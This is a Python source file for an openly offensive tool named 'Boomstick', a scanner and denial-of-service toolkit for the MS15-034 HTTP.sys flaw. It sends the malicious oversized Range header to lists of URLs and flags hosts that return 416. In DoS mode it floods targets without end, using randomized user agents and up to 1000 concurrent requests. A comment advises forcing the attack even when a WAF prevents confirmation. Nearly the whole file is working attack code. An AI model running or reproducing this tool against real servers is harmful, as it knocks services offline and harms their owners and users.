import argparse
import logging
import user_agent
import random
import coloredlogs
import verboselogs
import asyncio
from aiohttp import ClientSession
from aiohttp.client_exceptions import ClientConnectionError, ServerTimeoutError


verboselogs.install()
logger = logging.getLogger(__name__)


class Boomstick:

    @staticmethod
    def random_ua():

        ua = user_agent.generate_user_agent(navigator=["chrome", "firefox"])
        return ua

    async def fetch(self, url, session):

        headers = {
            "User-Agent": self.random_ua(),
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Range": "bytes=0-18446744073709551615",
            "Connection": "keep-alive"
        }

        try:
            async with session.get(url, headers=headers, timeout=30) as response:

                resp = await response.read()

                return {'response': resp.decode('utf8'), 'code': response.status}

        except (TimeoutError, ClientConnectionError, ServerTimeoutError):
            logger.success(f"Target at {url} was successfully brought down!")
            return None

    async def dos_bound_fetch(self, sem, url, session):
        # Getter function with semaphore.
        async with sem:
            results = await self.fetch(url, session)
            return results

    async def run_dos(self, target_urls, limit=1000):

        tasks = []
        # create instance of Semaphore
        sem = asyncio.Semaphore(limit) # Limit to 1k req/second.

        # Create client session that will ensure we dont open new connection per each request.
        async with ClientSession() as session:
            for url in target_urls:
                # pass Semaphore and session to every GET request
                task = asyncio.ensure_future(self.dos_bound_fetch(sem, url, session))
                tasks.append(task)

            responses = asyncio.gather(*tasks)
            await responses

    async def c_bound_fetch(self, sem, url, session):
        # Getter function with semaphore.
        async with sem:

            results = await self.fetch(url, session)
            code = results.get('code')
            body = results.get('response')

            if code == 416:
                logger.critical(f"Target at {url} is vulnerable!")
                return {'vuln': True, 'url': url, 'dump': body}

            else:
                if "Requested Range Not Satisfiable" in body:

                    logger.critical(f"Target at {url} is vulnerable!!")
                    return {'vuln': True, 'url': url, 'dump': body}

            return {'vuln': False, 'url': url, 'dump': body}

    async def check_vulns(self, target_urls, limit=1000):

        tasks = []
        vuln_hosts = []
        # create instance of Semaphore
        sem = asyncio.Semaphore(limit)  # Limit to 1k req/second.

        # Create client session that will ensure we dont open new connection per each request.
        async with ClientSession() as session:
            for url in target_urls:
                # pass Semaphore and session to every GET request
                task = asyncio.ensure_future(self.c_bound_fetch(sem, url, session))
                tasks.append(task)

            task_results = asyncio.gather(*tasks)
            await task_results

            results = task_results.result()

            for result in results:
                if result is None:
                    logger.debug("Got a null result for one of the workers. Could be a timeout issue.")
                else:
                    if result.get('vuln') is True:
                        vuln_hosts.append(result.get('url'))

            if len(vuln_hosts) > 0:
                logger.critical(f"Discovered {len(vuln_hosts)} vulnerable host(s)!")

            else:
                logger.success("No vulnerable hosts detected!")

            return vuln_hosts


if __name__ == "__main__":

    banner = """___  ___ _____ __   _____        _____  _____    ___  ______                       _____ _   _      _    
|  \/  |/  ___/  | |  ___|      |  _  ||____ |  /   | | ___ \                     /  ___| | (_)    | |   
| .  . |\ `--.`| | |___ \ ______| |/' |    / / / /| | | |_/ / ___   ___  _ __ ___ \ `--.| |_ _  ___| | __
| |\/| | `--. \| |     \ \______|  /| |    \ \/ /_| | | ___ \/ _ \ / _ \| '_ ` _ \ `--. \ __| |/ __| |/ /
| |  | |/\__/ /| |_/\__/ /      \ |_/ /.___/ /\___  | | |_/ / (_) | (_) | | | | | /\__/ / |_| | (__|   < 
\_|  |_/\____/\___/\____/        \___/ \____/     |_/ \____/ \___/ \___/|_| |_| |_\____/ \__|_|\___|_|\_\                                                                                                         
    """
    print(banner)

    parser = argparse.ArgumentParser(description="MS15-034 DoS toolkit and Vuln Scanner")

    parser.add_argument('-l', '--log-level', dest='log_level', action='store', help="Log level to use: debug, info, warn, err", default='INFO')
    parser.add_argument('-o', '--log-dir', dest='log_location', action='store', help="Specify the location for the log file to be saved.", default='./ms15_boomstick.log')
    parser.add_argument('-f', '--file', dest='input_file', action='store', help="Specify a list of URLs to scan or DoS.")
    parser.add_argument('-d', '--dos', dest='dos', action='store_true', help="Execute a DoS attack against the target(s).")
    parser.add_argument('-c', '--check', dest='check', action='store_true', help="Check for vulnerable hosts.")
    parser.add_argument('-u', '--url', dest='url', action='store', help="Execute a scan or DoS on a single host.")

    args = parser.parse_args()
    # Setup Logs
    if args.log_level.upper() == 'DEBUG':
        log_level = logging.DEBUG
    elif args.log_level.upper() == 'INFO':
        log_level = logging.INFO
    elif args.log_level.upper() == 'WARN':
        log_level = logging.WARN
    elif args.log_level.upper() == "ERR":
        log_level = logging.ERROR
    else:
        log_level = logging.INFO

    log_fmt = '%(asctime)s pid[%(process)d]: %(message)s'
    coloredlogs.install(level=log_level, fmt=log_fmt)

    fh = logging.FileHandler(args.log_location, mode='a', encoding='utf8', delay=False)
    lfmt = logging.Formatter(log_fmt)
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(lfmt)
    logger.addHandler(fh)

    scanner = Boomstick()
    loop = asyncio.get_event_loop()

    if args.input_file and args.url:

        logger.warning("Can't specify both --file and --url. Please chose one or the other.")
        exit(0)

    if args.input_file:

        try:
            with open(args.input_file, 'r') as f:
                url_list = f.readlines()
        except FileNotFoundError as err:
            logger.error(f"Could not find file at {args.input_file}. Check the filepath and try again.")
            exit(0)

        if args.check:

            vuln_hosts = loop.run_until_complete(scanner.check_vulns(target_urls=url_list))

        if args.dos:
            # If we ran a check, only target vulnerable hosts.
            if args.check:
                dos_targets = vuln_hosts

            else:
                dos_targets = url_list

            logger.info(f"Launching DoS attack against {len(dos_targets)} URLs.")
            logger.warning("Running DoS attack infinitely. Send CTRL+C to cancel.")
            while True:
                loop.run_until_complete(scanner.run_dos(target_urls=dos_targets))


    if args.url:

        target = []
        target.append(args.url)

        if args.check:

            isVuln = loop.run_until_complete(scanner.check_vulns(target_urls=target))

        if args.dos:

            if args.check:

                if isVuln:

                    logger.info(f"Launching DoS attack against {args.url}.")
                    logger.warning("Running DoS attack infinitely. Send CTRL+C to cancel.")

                    while True:
                        loop.run_until_complete(scanner.run_dos(target))

            else:
                while True:
                    # Keep this here to force DoS against target if we can't confirm the host is vulnerable because of a WAF.
                    loop.run_until_complete(scanner.run_dos(target))
